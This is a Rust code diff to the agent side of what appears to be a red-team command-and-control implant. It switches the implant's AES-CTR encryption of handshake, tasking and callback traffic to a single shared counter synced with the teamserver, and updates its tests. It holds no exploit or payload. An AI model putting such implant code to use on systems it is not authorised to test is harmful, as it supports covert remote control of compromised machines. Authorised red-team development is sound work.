@@ -1,7 +1,7 @@
 //! Core agent logic: init handshake and callback loop.
 
 use red_cell_common::crypto::{
-    AgentCryptoMaterial, decrypt_agent_data_at_offset, derive_session_keys,
+    AgentCryptoMaterial, ctr_blocks_for_len, decrypt_agent_data_at_offset, derive_session_keys,
     generate_agent_crypto_material,
 };
 use red_cell_common::demon::{DemonCommand, DemonMessage};
@@ -22,10 +22,11 @@ pub struct SpecterAgent {
     session_crypto: AgentCryptoMaterial,
     config: SpecterConfig,
     transport: HttpTransport,
-    /// Current CTR block offset for outgoing encryption.
-    send_ctr_offset: u64,
-    /// Current CTR block offset for incoming decryption.
-    recv_ctr_offset: u64,
+    /// Shared monotonic CTR block offset, mirroring the server's single offset.
+    ///
+    /// Both encrypt (send) and decrypt (recv) operations use and advance this
+    /// single counter, matching the teamserver's `AgentEntry::ctr_block_offset`.
+    ctr_offset: u64,
 }
 
 impl SpecterAgent {
@@ -49,15 +50,7 @@ impl SpecterAgent {
             "agent initialized"
         );
 
-        Ok(Self {
-            agent_id,
-            raw_crypto,
-            session_crypto,
-            config,
-            transport,
-            send_ctr_offset: 0,
-            recv_ctr_offset: 0,
-        })
+        Ok(Self { agent_id, raw_crypto, session_crypto, config, transport, ctr_offset: 0 })
     }
 
     /// Collect metadata about the current host environment.
@@ -100,14 +93,16 @@ impl SpecterAgent {
         info!(agent_id = format_args!("0x{:08X}", self.agent_id), "sending DEMON_INIT");
 
         let response = self.transport.send(&packet).await?;
-        // Validate the ACK; legacy CTR mode means offset stays at 0.
-        parse_init_ack(&response, self.agent_id, &self.session_crypto)?;
+        let ack_blocks = parse_init_ack(&response, self.agent_id, &self.session_crypto)?;
+
+        // The init ACK consumes CTR blocks on the shared offset (server advances
+        // the same counter when it encrypts the ACK).
+        self.ctr_offset += ack_blocks;
 
         info!(
             agent_id = format_args!("0x{:08X}", self.agent_id),
-            send_ctr = self.send_ctr_offset,
-            recv_ctr = self.recv_ctr_offset,
-            "DEMON_INIT handshake complete"
+            ctr_offset = self.ctr_offset,
+            "DEMON_INIT handshake complete (monotonic CTR)"
         );
 
         Ok(())
@@ -119,10 +114,10 @@ impl SpecterAgent {
         let tasking = parse_tasking_response(
             self.agent_id,
             &self.session_crypto,
-            self.recv_ctr_offset,
+            self.ctr_offset,
             &response,
         )?;
-        self.sync_ctr_offsets(tasking.next_recv_ctr_offset);
+        self.ctr_offset = tasking.next_recv_ctr_offset;
 
         Ok(tasking.decrypted)
     }
@@ -180,16 +175,10 @@ impl SpecterAgent {
         self.agent_id
     }
 
-    /// Return the current send-side CTR block offset.
+    /// Return the current shared CTR block offset.
     #[must_use]
-    pub fn send_ctr_offset(&self) -> u64 {
-        self.send_ctr_offset
-    }
-
-    /// Return the current receive-side CTR block offset.
-    #[must_use]
-    pub fn recv_ctr_offset(&self) -> u64 {
-        self.recv_ctr_offset
+    pub fn ctr_offset(&self) -> u64 {
+        self.ctr_offset
     }
 
     async fn send_callback(
@@ -201,14 +190,18 @@ impl SpecterAgent {
         let packet = build_callback_packet(
             self.agent_id,
             &self.session_crypto,
-            self.send_ctr_offset,
+            self.ctr_offset,
             u32::from(command),
             request_id,
             payload,
         )?;
         let response = self.transport.send(&packet).await?;
-        // Legacy CTR mode: server resets AES-CTR to block 0 for every packet,
-        // so our offset must also remain 0 after each send.
+
+        // Monotonic CTR: advance the shared offset by the blocks consumed by the
+        // encrypted portion of the callback packet (payload_len(4) + payload_bytes).
+        let encrypted_len = 4 + payload.len();
+        self.ctr_offset += ctr_blocks_for_len(encrypted_len);
+
         Ok(response)
     }
 
@@ -222,24 +215,21 @@ impl SpecterAgent {
 
         for mut package in message.packages {
             if !package.payload.is_empty() {
-                // Legacy CTR mode: server encrypts each job payload independently at
-                // block offset 0.  Decrypt each package at offset 0 to match.
+                // Monotonic CTR: decrypt each payload at the shared offset and
+                // advance by the blocks consumed by the ciphertext.
+                let ciphertext_len = package.payload.len();
                 package.payload = decrypt_agent_data_at_offset(
                     &self.session_crypto.key,
                     &self.session_crypto.iv,
-                    0,
+                    self.ctr_offset,
                     &package.payload,
                 )?;
+                self.ctr_offset += ctr_blocks_for_len(ciphertext_len);
             }
             packages.push(package);
         }
 
         Ok(DemonMessage::new(packages))
-    }
-
-    fn sync_ctr_offsets(&mut self, offset: u64) {
-        self.send_ctr_offset = offset;
-        self.recv_ctr_offset = offset;
     }
 }
 
@@ -391,33 +381,42 @@ mod tests {
     }
 
     #[test]
-    fn ctr_accessors_reflect_current_offsets() {
+    fn ctr_accessor_reflects_current_offset() {
         let mut agent = SpecterAgent::new(SpecterConfig::default()).expect("agent");
-        agent.sync_ctr_offsets(7);
+        agent.ctr_offset = 7;
 
-        assert_eq!(agent.send_ctr_offset(), 7);
-        assert_eq!(agent.recv_ctr_offset(), 7);
+        assert_eq!(agent.ctr_offset(), 7);
     }
 
     #[test]
-    fn decrypt_job_message_decrypts_payloads_with_legacy_ctr() {
+    fn decrypt_job_message_decrypts_payloads_with_monotonic_ctr() {
         let mut agent = SpecterAgent::new(SpecterConfig::default()).expect("agent");
-        // Legacy CTR: offset is always 0; server encrypts each payload independently
-        // at block offset 0, so the agent must also decrypt each at offset 0.
+        // Monotonic CTR: the shared offset starts at some value and advances as
+        // each payload is decrypted.  Simulate the server encrypting payloads at
+        // successive offsets.
+        let start_offset: u64 = 5;
+        agent.ctr_offset = start_offset;
 
         let first_plaintext = vec![0xAA, 0xBB, 0xCC];
         let second_plaintext = vec![0x10; 17];
+
+        // Server encrypts first payload at the current shared offset.
         let first_payload = red_cell_common::crypto::encrypt_agent_data_at_offset(
             &agent.session_crypto.key,
             &agent.session_crypto.iv,
-            0,
+            start_offset,
             &first_plaintext,
         )
         .expect("encrypt first payload");
+
+        // Server advances offset after first payload.
+        let offset_after_first =
+            start_offset + red_cell_common::crypto::ctr_blocks_for_len(first_payload.len());
+
         let second_payload = red_cell_common::crypto::encrypt_agent_data_at_offset(
             &agent.session_crypto.key,
             &agent.session_crypto.iv,
-            0,
+            offset_after_first,
             &second_plaintext,
         )
         .expect("encrypt second payload");
@@ -436,8 +435,10 @@ mod tests {
         assert_eq!(message.packages[0].payload, first_plaintext);
         assert!(message.packages[1].payload.is_empty());
         assert_eq!(message.packages[2].payload, second_plaintext);
-        // Legacy CTR: offsets remain 0 (server always uses block offset 0 per packet).
-        assert_eq!(agent.recv_ctr_offset(), 0);
-        assert_eq!(agent.send_ctr_offset(), 0);
+        // Monotonic CTR: offset must have advanced past the initial value.
+        assert!(
+            agent.ctr_offset() > start_offset,
+            "CTR offset must advance after decrypting job payloads"
+        );
     }
 }
